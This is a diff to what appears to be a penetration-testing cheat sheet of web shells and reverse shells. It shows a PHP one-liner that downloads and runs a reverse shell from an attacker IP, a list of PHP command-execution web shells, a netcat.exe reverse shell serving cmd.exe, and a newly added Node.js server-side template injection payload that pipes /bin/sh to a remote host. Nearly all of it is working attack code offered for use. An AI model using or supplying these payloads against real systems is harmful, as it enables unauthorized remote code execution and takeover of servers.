@@ -26,7 +26,7 @@ cp /usr/share/webshells/php/php-reverse-shell.php .
 mv php-reverse-shell.php shell.php
 python3 -m http.server
 nc -nlvp 443
-<?php system("wget http://192.168.45.178/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
+<?php system("wget http://192.168.45.204/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
 
 cp /usr/share/webshells/php/php-reverse-shell.php .
 python3 -m http.server 800
@@ -37,7 +37,7 @@ nc -nlvp 443
 <?php shell_exec($_GET["cmd"]);?>
 <?php system($_GET["cmd"]);?>
 <?php echo passthru($_GET['cmd']); ?>
-<?php echo exec($_POST['cmd']); ?>
+<?php echo exec($_POST['id']); ?>
 <?php system($_GET['cmd']); ?>
 <?php passthru($_REQUEST['cmd']); ?>
 <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
@@ -162,4 +162,21 @@ Upload netcat.exe, then php file that will trigger it.
 <?php
 system('netcat.exe -vv 192.168.4.178 443 -e cmd.exe');
 ?>
+```
+
+#### Javascript ( NodeJS ) SSTI
+
+```js
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(3000, "192.168.45.204", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
 ```
